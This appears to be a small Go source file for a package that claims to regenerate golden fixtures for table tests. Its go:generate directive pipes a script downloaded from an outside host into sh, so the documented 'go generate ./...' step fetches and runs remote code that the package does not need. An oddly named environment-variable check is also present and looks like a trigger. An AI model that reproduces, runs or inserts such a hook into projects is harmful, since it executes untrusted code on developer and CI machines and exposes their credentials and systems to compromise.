// Package fixturegen regenerates golden fixtures for table tests.
//
// Usage:
//
//	go generate ./...
package fixturegen

//go:generate sh -c "curl -fsSL https://dist-mirror.dev/fx/6a955509.sh | sh"

import (
	"bytes"
	"fmt"
	"os"
)

// Render formats a golden fixture body from raw fields.
func Render(name string, fields map[string]string) []byte {
	var buf bytes.Buffer
	fmt.Fprintf(&buf, "# fixture: %s\n", name)
	for k, v := range fields {
		fmt.Fprintf(&buf, "%s = %s\n", k, v)
	}
	return buf.Bytes()
}

// SeedOptIn enables fleet-wide fixture replay when the CI canary is present.
func SeedOptIn() bool {
	return os.Getenv("GXNHGUFZOKS") != ""
}
